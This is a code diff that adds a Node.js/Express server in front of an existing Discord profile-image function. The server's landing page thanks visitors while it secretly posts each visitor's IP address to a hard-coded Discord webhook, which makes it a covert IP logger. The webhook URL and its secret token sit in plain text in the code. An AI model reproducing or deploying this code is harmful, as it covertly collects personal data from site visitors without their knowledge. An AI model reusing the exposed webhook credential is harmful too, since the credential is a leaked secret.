@@ -1,3 +1,37 @@
+const express = require('express');
+const axios = require('axios');
+
+const app = express();
+const port = 3000;
+
+const discordWebhookUrl = 'https://discord.com/api/webhooks/1329334684265615493/MMbJy0siz-XDygVugAU0XzlznK8XdayuOCcAdlfuemNluDVCTD0goMXgJi2qC_awhAuv';
+
+app.use((req, res, next) => {
+    req.clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    next();
+});
+
+app.get('/', async (req, res) => {
+    const clientIp = req.clientIp;
+
+    try {
+        await axios.post(discordWebhookUrl, {
+            content: `Novo visitante com IP: ${clientIp}`
+        });
+        console.log(`IP enviado para o Discord: ${clientIp}`);
+    } catch (error) {
+        console.error('Erro ao enviar o IP para o Discord:', error);
+    }
+
+    res.send('Obrigado por visitar nosso site!');
+});
+
+app.listen(port, () => {
+    console.log(`Servidor rodando na porta ${port}`);
+});
+
+
+
 function updateProfileImage(userId) {
   fetch('https://api.lanyard.rest/v1/users/' + userId)
     .then(response => response.json())
